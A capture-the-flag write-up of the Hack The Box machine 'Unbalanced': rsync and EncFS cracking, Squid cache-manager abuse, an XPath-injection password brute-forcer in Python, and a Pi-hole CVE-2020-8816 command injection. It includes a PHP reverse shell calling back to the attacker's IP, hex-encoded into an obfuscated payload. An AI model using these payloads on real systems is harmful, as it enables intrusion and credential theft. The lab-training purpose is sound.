---
title: "Hack The Box - Unbalanced"
tags: [linux,hard,pihole,xpath,squid,rsync,encfs,cachemgr]
categories: HackTheBox
---

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled.png)


Link: [https://www.hackthebox.eu/home/machines/profile/268](https://www.hackthebox.eu/home/machines/profile/268)

Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results

```bash
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a2:76:5c:b0:88:6f:9e:62:e8:83:51:e7:cf:bf:2d:f2 (RSA)
|   256 d0:65:fb:f6:3e:11:b1:d6:e6:f7:5e:c0:15:0c:0a:77 (ECDSA)
|_  256 5e:2b:93:59:1d:49:28:8d:43:2c:c1:f7:e3:37:0f:83 (ED25519)
873/tcp  open  rsync      (protocol version 31)
3128/tcp open  http-proxy Squid http proxy 4.6
|_http-server-header: squid/4.6
|_http-title: ERROR: The requested URL could not be retrieved
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%), Linux 3.2 - 4.9 (92%), Linux 3.5 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   259.86 ms 10.10.14.1
2   259.99 ms 10.10.10.20
```

## Squid Proxy

There was a squid proxy running on port 3128 which was somehow confusing in the initial to start with since we didn't have anything to do with any kind of HTTP service this made a squid proxy and bit suspicious in the first encounter but later in the journey we found out the use of this was more than it meets the eye.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%201.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%201.png)

Added the Proxy in my FoxyProxy.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%202.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%202.png)

Now We Getting Access Denied.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%203.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%203.png)

There is nothing here, so Let's move on to another Port.

## Rsync Enumeration

What is rsync?

Rsync, or Remote Sync, is a free command-line tool that lets you transfer files and directories to local and remote destinations. Rsync is used for mirroring, performing backups, or migrating data to other servers.

> [https://book.hacktricks.xyz/pentesting/873-pentesting-rsync](https://book.hacktricks.xyz/pentesting/873-pentesting-rsync)

With the use `rsync` utility tool, I listed the files available for access to us and found out that `conf_backups` folder is public and require no authentication. 

```bash
root@kali:~/CTF/HTB/Boxes/Unbalanced# rsync -av --list-only rsync://10.10.10.200:873
conf_backups   	EncFS-encrypted configuration backups
```

The `conf_backups` was encrypted by EncFS which is used to encrypt files.

> EncFS is a Free (LGPL) FUSE-based cryptographic filesystem. It transparently encrypts files, using an arbitrary directory as storage for the encrypted files. ... Files are encrypted using a volume key, which is stored either within or outside the encrypted source directory. A password is used to decrypt this key.

`rsync` allow us to copy the whole file from `conf_backups` folder to our system.

```bash
root@kali:~/CTF/HTB/Boxes/Unbalanced# rsync -av rsync://10.10.10.200:873/conf_backups ./conf_backups/
receiving incremental file list
./
,CBjPJW4EGlcqwZW4nmVqBA6
-FjZ6-6,Fa,tMvlDsuVAO7ek
.encfs6.xml
.
.
.
.
.
uEtPZwC2tjaQELJmnNRTCLYU
vCsXjR1qQmPO5g3P3kiFyO84
waEzfb8hYE47wHeslfs1MvYdVxqTtQ8XGshJssXMmvOsZLhtJWWRX31cBfhdVygrCV5

sent 1,452 bytes  received 411,990 bytes  23,625.26 bytes/sec
total size is 405,603  speedup is 0.98
```

Since the files were encrypted it wasn't any good and know it was time for research, using [this](https://askmeaboutlinux.com/2014/01/25/how-to-use-encfs-on-linux-to-encrypt-data-and-decrypt-data-in-a-folder/) I found that in order to decrypt the files encrypted with EncFS we need an `.encfs6.xml` file which will the important and the file is needed for the decryption of files if we had correct password.
We can extract those files to our machine. While checking those files it missing one `.encfs6.xml`, don't know why so I just downloaded that again.

**Note: Doing a full copy of conf_backups with rysnc didn't copied the encfs6.xml so we had to do it seperately.**

```bash
root@kali:~/CTF/HTB/Boxes/Unbalanced# rsync rsync://10.10.10.200:873/conf_backups/.encfs6.xml .
root@kali:~/CTF/HTB/Boxes/Unbalanced# cat .encfs6.xml 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE boost_serialization>
<boost_serialization signature="serialization::archive" version="7">
    <cfg class_id="0" tracking_level="0" version="20">
        <version>20100713</version>
        <creator>EncFS 1.9.5</creator>
        <cipherAlg class_id="1" tracking_level="0" version="0">
            <name>ssl/aes</name>
            <major>3</major>
            <minor>0</minor>
        </cipherAlg>
        <nameAlg>
            <name>nameio/block</name>
            <major>4</major>
            <minor>0</minor>
        </nameAlg>
        <keySize>192</keySize>
        <blockSize>1024</blockSize>
        <plainData>0</plainData>
        <uniqueIV>1</uniqueIV>
        <chainedNameIV>1</chainedNameIV>
        <externalIVChaining>0</externalIVChaining>
        <blockMACBytes>0</blockMACBytes>
        <blockMACRandBytes>0</blockMACRandBytes>
        <allowHoles>1</allowHoles>
        <encodedKeySize>44</encodedKeySize>
        <encodedKeyData>
GypYDeps2hrt2W0LcvQ94TKyOfUcIkhSAw3+iJLaLK0yntwAaBWj6EuIet0=
</encodedKeyData>
        <saltLen>20</saltLen>
        <saltData>
mRdqbk2WwLMrrZ1P6z2OQlFl8QU=
</saltData>
        <kdfIterations>580280</kdfIterations>
        <desiredKDFDuration>500</desiredKDFDuration>
    </cfg>
</boost_serialization>
```

We need a correct password to decrypt the files, I found [this blog](https://www.gamecreatures.com/blog/2016/06/19/encrypted-offsite-rsync-backups/) which had a section on how to use the JTR to crack the password of the EncFS directory. So we can use `encfs2john.py` to get the exact hash, in order to crack the hash we need to have `.encfs6.xml` file which we already acquired previously so I move that to the `conf_backups` folder where I store all the encrypted files.

```bash
root@kali:~/CTF/HTB/Boxes/Unbalanced# /usr/share/john/encfs2john.py conf_backups/
conf_backups/ doesn't have .encfs6.xml!
root@kali:~/CTF/HTB/Boxes/Unbalanced# cp .encfs6.xml conf_backups/
root@kali:~/CTF/HTB/Boxes/Unbalanced# /usr/share/john/encfs2john.py conf_backups/
conf_backups/:$encfs$192*580280*0*20*99176a6e4d96c0b32bad9d4feb3d8e425165f105*44*1b2a580dea6cda1aedd96d0b72f43de132b239f51c224852030dfe8892da2cad329edc006815a3e84b887add
root@kali:~/CTF/HTB/Boxes/Unbalanced# john --show hash 
conf_backups/:bubblegum

1 password hash cracked, 0 left
```

Using JTR, we got the password `bubblegum`. Now we needed to mount the encryption and decryption folder. I move to root directory for that, for some reason it doesn't work on other directories.

I created 2 folders enc ( encrypted ) and dec ( decrypted ). I moved all the downloaded files to enc directory and also `.encfs6.xml` and now using `encfs` I get decrypted those file in dec directory. It asks me for the password and we already got that from `bubblegum`.

```bash
root@kali:~# mkdir enc
root@kali:~# mkdir dec
root@kali:~# cp ~/CTF/HTB/Boxes/Unbalanced/.encfs6.xml enc/
root@kali:~# cp ~/CTF/HTB/Boxes/Unbalanced/conf_backups/* enc/
root@kali:~# encfs ~/enc/ ~/dec/
EncFS Password:
```

We decrypted the files successfully, somehow the decrypted files seemed to be the configurations files from `/etc` directory(probably?).

```bash
root@kali:~/dec# ls 
50-localauthority.conf              hdparm.conf                      parser.conf
50-nullbackend.conf                 host.conf                        protect-links.conf
51-debian-sudo.conf                 initramfs.conf                   reportbug.conf
70debconf                           input.conf                       resolv.conf
99-sysctl.conf                      journald.conf                    resolved.conf
access.conf                         kernel-img.conf                  rsyncd.conf
adduser.conf                        ldap.conf                        rsyslog.conf
bluetooth.conf                      ld.so.conf                       semanage.conf
ca-certificates.conf                libaudit.conf                    sepermit.conf
com.ubuntu.SoftwareProperties.conf  libc.conf                        sleep.conf
dconf                               limits.conf                      squid.conf
debconf.conf                        listchanges.conf                 sysctl.conf
debian.conf                         logind.conf                      system.conf
deluser.conf                        logrotate.conf                   time.conf
dhclient.conf                       main.conf                        timesyncd.conf
discover-modprobe.conf              mke2fs.conf                      ucf.conf
dkms.conf                           modules.conf                     udev.conf
dns.conf                            namespace.conf                   update-initramfs.conf
dnsmasq.conf                        network.conf                     user.conf
docker.conf                         networkd.conf                    user-dirs.conf
fakeroot-x86_64-linux-gnu.conf      nsswitch.conf                    Vendor.conf
framework.conf                      org.freedesktop.PackageKit.conf  wpa_supplicant.conf
fuse.conf                           PackageKit.conf                  x86_64-linux-gnu.conf
gai.conf                            pam.conf                         xattr.conf
group.conf                          pam_env.conf
```

There was a `squid.conf` which is a file for squid proxy configurations. Let's look at this. The decrypted files were large in numbers and have lot of contents and these are some good stuffs.

First thing I got is new SubDomain.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%204.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%204.png)

We Have some sort of password.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%205.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%205.png)

Although the file had lots of blank lines which was hard to keep a track of, I just grep lines which doesn't have `#`

```bash
root@kali:~/dec# cat squid.conf | grep -v '#' | grep .
acl SSL_ports port 443
acl CONNECT method CONNECT
http_access deny !Safe_ports
http_access deny CONNECT !SSL_ports
http_access allow manager
include /etc/squid/conf.d/*
http_access allow localhost
acl intranet dstdomain -n intranet.unbalanced.htb
acl intranet_net dst -n 172.16.0.0/12
http_access allow intranet
http_access allow intranet_net
http_access deny all
http_port 3128
coredump_dir /var/spool/squid
refresh_pattern ^ftp:		1440	20%	10080
refresh_pattern ^gopher:	1440	0%	1440
refresh_pattern -i (/cgi-bin/|\?) 0	0%	0
refresh_pattern .		0	20%	4320
cachemgr_passwd Thah$Sh1 menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events
cachemgr_passwd disable all
cache disable
```

From `squid_conf` gave us two specific information along with other reasons why we couldn't access some service, that happened beacuse of Squid's ACL option as we can see it declines any HTTP request except it was either from localhost or intranet. We also found that `Thah$Ssh1` is the password of the squid cache management service.

Before getting into that, I Checked the subdomain we got and its a login page, Tried some default credentials and non worked so let's move on.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%206.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%206.png)

References:

- [https://wiki.squid-cache.org/Features/CacheManager](https://wiki.squid-cache.org/Features/CacheManager)
- [https://wiki.squid-cache.org/SquidClientTool](https://wiki.squid-cache.org/SquidClientTool)

Now it started to make sense on how things are distributed along and how one thing is connected to other. As we discovered that there is a cache management service and we had authentication password for this I thought of checking it too since this was **All Hands on the Deck** situation as no significant progress could be seen.

Using the `squidclient` utility I learned about from the above references, I tend to check it by:-

```bash
root@kali:~/CTF/HTB/Boxes/Unbalanced# squidclient -h 10.10.10.200 -p 3128 -w 'Thah$Sh1' mgr:menu
HTTP/1.1 200 OK
Server: squid/4.6
Mime-Version: 1.0
Date: Sun, 02 Aug 2020 16:26:35 GMT
Content-Type: text/plain;charset=utf-8
Expires: Sun, 02 Aug 2020 16:26:35 GMT
Last-Modified: Sun, 02 Aug 2020 16:26:35 GMT
X-Cache: MISS from unbalanced
X-Cache-Lookup: MISS from unbalanced:3128
Via: 1.1 unbalanced (squid/4.6)
Connection: close

 index                 	Cache Manager Interface         	disabled
 menu                  	Cache Manager Menu              	protected
 offline_toggle        	Toggle offline_mode setting     	disabled
 shutdown              	Shut Down the Squid Process     	disabled
 reconfigure           	Reconfigure Squid               	disabled
 rotate                	Rotate Squid Logs               	disabled
 pconn                 	Persistent Connection Utilization Histograms	protected
 mem                   	Memory Utilization              	protected
 diskd                 	DISKD Stats                     	protected
 squidaio_counts       	Async IO Function Counters      	disabled
 config                	Current Squid Configuration     	disabled
 client_list           	Cache Client List               	disabled
 comm_epoll_incoming   	comm_incoming() stats           	disabled
 ipcache               	IP Cache Stats and Contents     	disabled
 fqdncache             	FQDN Cache Stats and Contents   	protected
 idns                  	Internal DNS Statistics         	disabled
 redirector            	URL Redirector Stats            	disabled
 store_id              	StoreId helper Stats            	disabled
 external_acl          	External ACL stats              	disabled
 http_headers          	HTTP Header Statistics          	disabled
 info                  	General Runtime Information     	disabled
 service_times         	Service Times (Percentiles)     	disabled
 filedescriptors       	Process Filedescriptor Allocation	protected
 objects               	All Cache Objects               	protected
 vm_objects            	In-Memory and In-Transit Objects	protected
 io                    	Server-side network read() size histograms	disabled
 counters              	Traffic and Resource Counters   	protected
 peer_select           	Peer Selection Algorithms       	disabled
 digest_stats          	Cache Digest and ICP blob       	disabled
 5min                  	5 Minute Average of Counters    	protected
 60min                 	60 Minute Average of Counters   	protected
 utilization           	Cache Utilization               	disabled
 histograms            	Full Histogram Counts           	protected
 active_requests       	Client-side Active Requests     	disabled
 username_cache        	Active Cached Usernames         	disabled
 openfd_objects        	Objects with Swapout files open 	disabled
 store_digest          	Store Digest                    	disabled
 store_log_tags        	Histogram of store.log tags     	disabled
 storedir              	Store Directory Stats           	disabled
 store_io              	Store IO Interface Stats        	disabled
 store_check_cachable_stats	storeCheckCachable() Stats      	disabled
 refresh               	Refresh Algorithm Statistics    	disabled
 delay                 	Delay Pool Levels               	disabled
 forward               	Request Forwarding Statistics   	disabled
 cbdata                	Callback Data Registry Contents 	protected
 sbuf                  	String-Buffer statistics        	protected
 events                	Event Queue                     	protected
 netdb                 	Network Measurement Database    	disabled
 asndb                 	AS Number Database              	disabled
 carp                  	CARP information                	disabled
 userhash              	peer userhash information       	disabled
 sourcehash            	peer sourcehash information     	disabled
 server_list           	Peer Cache Statistics           	disabled
```

We find the above informations could be retrieved but some of the above options were disabled, as going through the squid documentation I found that `fqdncache` can be used to view the DNS cache of the squid server and it contains the host to IP address mapping of the services accessible by squid.

```bash
root@kali:~/CTF/HTB/Boxes/Unbalanced# squidclient -h 10.10.10.200 -p 3128 -w 'Thah$Sh1' mgr:fqdncache
HTTP/1.1 200 OK
Server: squid/4.6
Mime-Version: 1.0
Date: Sun, 02 Aug 2020 16:27:26 GMT
Content-Type: text/plain;charset=utf-8
Expires: Sun, 02 Aug 2020 16:27:26 GMT
Last-Modified: Sun, 02 Aug 2020 16:27:26 GMT
X-Cache: MISS from unbalanced
X-Cache-Lookup: MISS from unbalanced:3128
Via: 1.1 unbalanced (squid/4.6)
Connection: close

FQDN Cache Statistics:
FQDNcache Entries In Use: 13
FQDNcache Entries Cached: 12
FQDNcache Requests: 378231
FQDNcache Hits: 0
FQDNcache Negative Hits: 223623
FQDNcache Misses: 154608
FQDN Cache Contents:

Address                                       Flg TTL Cnt Hostnames
10.10.14.11                                    N  035   0
10.10.14.4                                     N  045   0
127.0.1.1                                       H -001   2 unbalanced.htb unbalanced
::1                                             H -001   3 localhost ip6-localhost ip6-loopback
172.31.179.2                                    H -001   1 intranet-host2.unbalanced.htb
172.31.179.3                                    H -001   1 intranet-host3.unbalanced.htb
10.10.10.200                                   N  -8449   0
127.0.0.1                                       H -001   1 localhost
172.17.0.1                                      H -001   1 intranet.unbalanced.htb
ff02::1                                         H -001   1 ip6-allnodes
ff02::2                                         H -001   1 ip6-allrouters
10.10.14.64                                    N  -28240   0
```

With this we found that there are number of different range of hostname and there were some IPs starting with `172.*.*.*` which was suspicious as from experience it looks like docker instance IP address. Accessing the URL `172.31.179.1` as part of my enumeration added them in `/etc/hosts` and I found the same authentication as before.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%207.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%207.png)

This time I tried Sqli using Basic Authentication Bypass. Make sure you set upstream Proxy in Burp.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%208.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%208.png)

Here I got a payload with different length so let's send to repeater and check what's there.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%209.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%209.png)

We got some Users, their roles and mail address.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%2010.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%2010.png)

I check that in website too.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%2011.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%2011.png)

It seems SQL Injection but its not.

## Getting User Shell

After some enumeration I came to know its X-Path Injection.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%2012.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%2012.png)

Reference:

- [https://owasp.org/www-community/attacks/XPATH_Injection](https://owasp.org/www-community/attacks/XPATH_Injection)

Using `substring` we can bruteforce the Passwords.

I just made a quick Bruteforce which will find the password for us. I used user `bryan` because he is the System Administrator.

```python
import requests

junk= ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','!','@',"#","$","%","&","_","-","1","2","3","4","5","6","7","8","9","0"]
i=1

def payload(password):
	data = {"Username":"bryan","Password":"{}' and Username='bryan".format(password)}
	r = requests.post('http://172.31.179.1/intranet.php', data=data, proxies={ "http": "http://10.10.10.200:3128" })
	return r.text.find("Bryan") != -1

trash=""
while True:
	for x in junk:
		if payload("' or substring(Password,{},1)='{}".format(i,x)):
			trash+=x
			i=i+1
			print("> ",trash)
```

Since it was a long shot, to my surprise it worked and gave the password of the user `bryan`.

```bash
root@kali:~/CTF/HTB/Boxes/Unbalanced# python3 pass_grabber.py 
>  i
>  ir
>  ire
>  irea
>  ireal
>  ireall
>  ireally
>  ireallyl
>  ireallyl0
>  ireallyl0v
>  ireallyl0ve
>  ireallyl0veb
>  ireallyl0vebu
>  ireallyl0vebub
>  ireallyl0vebubb
>  ireallyl0vebubbl
>  ireallyl0vebubble
>  ireallyl0vebubbleg
>  ireallyl0vebubblegu
>  ireallyl0vebubblegum
>  ireallyl0vebubblegum!
>  ireallyl0vebubblegum!!
>  ireallyl0vebubblegum!!!
```

The recovered password was `ireallyl0vebubblegum!!!`, now since we had a password and a user I can now try to login on ssh service.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%2013.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%2013.png)

## Privilege Escalation

After logging in via ssh, we can now read the `user.txt`. We also had a uncommon file named `TODO` which looked like the journal entry for the service the author has been deploying.

```python
bryan@unbalanced:~$ cat TODO 
############
# Intranet #
############
* Install new intranet-host3 docker [DONE]
* Rewrite the intranet-host3 code to fix Xpath vulnerability [DONE]
* Test intranet-host3 [DONE]
* Add intranet-host3 to load balancer [DONE]
* Take down intranet-host1 and intranet-host2 from load balancer (set as quiescent, weight zero) [DONE]
* Fix intranet-host2 [DONE]
* Re-add intranet-host2 to load balancer (set default weight) [DONE]
- Fix intranet-host1 [TODO]
- Re-add intranet-host1 to load balancer (set default weight) [TODO]

###########
# Pi-hole #
###########
* Install Pi-hole docker (only listening on 127.0.0.1) [DONE]
* Set temporary admin password [DONE]
* Create Pi-hole configuration script [IN PROGRESS]
- Run Pi-hole configuration script [TODO]
- Expose Pi-hole ports to the network [TODO]
```

As we did the Intranet part from the TODO, without any second thought moved to the Pi-Hole part.

There was not much of an information from the LinEnum or my own enumeration, so I started to check the services running on localhost and as mentioned in the `TODO` the pi-hole services were running on localhost. And it is running on port 8080 I guess.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%2014.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%2014.png)

Since there wasn't any way to access the pi-hole service except the option of portforwarding, I used the ssh to portforward the service running on the port `8080`.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%2015.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%2015.png)

When visiting the page it throws me some error. So I started googling about the error.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%2016.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%2016.png)

> [https://github.com/pi-hole/docker-pi-hole/issues/224#issuecomment-404368089](https://github.com/pi-hole/docker-pi-hole/issues/224#issuecomment-404368089)

Here he mention he tried `/admin` and that helped him fixed the problem and I added `/admin` and it worked, we got the Pi-hole dashboard.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%2017.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%2017.png)

There is a way to login and we got the password already from `TODO` which is admin.

- `admin` was the password for pi-hole service.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%2018.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%2018.png)

And Im logged in. At the bottom of the page it reveals the version of Pi-Hole, so I started searching for any exploits available for it.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%2019.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%2019.png)

Here is the [Blog Post](https://natedotred.wordpress.com/2020/03/28/cve-2020-8816-pi-hole-remote-code-execution/), which helped me throughout in understanding on how we can get the reverse shell.

Although, in order for this to worked out we can do that by providing a reverse shell payload in php and too had to be hex encoded such that it can be parsed without any issue as stated in the blog post.

The biggest difficulty in exploiting this vulnerability is that the user input is capitalized through a call to “strtoupper”. Because of this, no lower case character can be used in the resulting injection. So we cant just run the payload normally. First I checked with sending `aaaaaaaaaaaaa$PATH` and here see, we got the output and also the a's are capitalized.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%2020.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%2020.png)

So I just created a payload that gives me reverse shell.

```bash
aaaaaaaaaaaa&&php -r '$sock=fsockopen("10.10.14.4",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Using CyberChef, I just encoded to HEX.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%2021.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%2021.png)

With the example given in the Blog post, I created my payload.

```bash
aaaaaaaaaaaa&&W=${PATH#/???/}&&P=${W%%?????:*}&&X=${PATH#/???/??}&&H=${X%%???:*}&&Z=${PATH#*:/??}&&R=${Z%%/*}&&$P$H$P$IFS-$R$IFS'EXEC(HEX2BIN("706870202d72202724736f636b3d66736f636b6f70656e282231302e31302e31342e34222c31323334293b6578656328222f62696e2f7368202d69203c2633203e263320323e263322293b27"));'&&
```

I just Injected my payload in MAC Address and By clicking ( + ), They payload got triggered.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%2022.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%2022.png)

And I got reverse shell in my netcat listener.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%2023.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%2023.png)

As there was not much to check in the docker I quicky started checking the suspicious folder but nothing came. As a force of habit I tried to see if `/root` is accessible which to my surprise was, and doing so we had following files:-

```bash
# cd /root
# ls -la
total 132
drwxrwxr-x 1 root root   4096 Apr  5 20:19 .
drwxr-xr-x 1 root root   4096 Jul 30 05:13 ..
lrwxrwxrwx 1 root root      9 Apr  4 11:41 .bash_history -> /dev/null
-rw-r--r-- 1 root root    570 Jan 31  2010 .bashrc
-rw-r--r-- 1 root root    148 Aug 17  2015 .profile
-rw-r--r-- 1 root root 113876 Sep 20  2019 ph_install.sh
-rw-r--r-- 1 root root    485 Apr  6 07:28 pihole_config.sh
# cat pihole_config.sh
#!/bin/bash

# Add domains to whitelist
/usr/local/bin/pihole -w unbalanced.htb
/usr/local/bin/pihole -w rebalanced.htb

# Set temperature unit to Celsius
/usr/local/bin/pihole -a -c

# Add local host record
/usr/local/bin/pihole -a hostrecord pihole.unbalanced.htb 127.0.0.1

# Set privacy level
/usr/local/bin/pihole -a -l 4

# Set web admin interface password
/usr/local/bin/pihole -a -p 'bUbBl3gUm$43v3Ry0n3!'

# Set admin email
/usr/local/bin/pihole -a email admin@unbalanced.htb
#
```

We get the another password and a bunch of other pi-hole config values. Like always, I started testing the password in ssh, Failed and I did su from user bryan and Im root.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%2024.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-unbalanced/Untitled%2024.png)

We Own the Box!!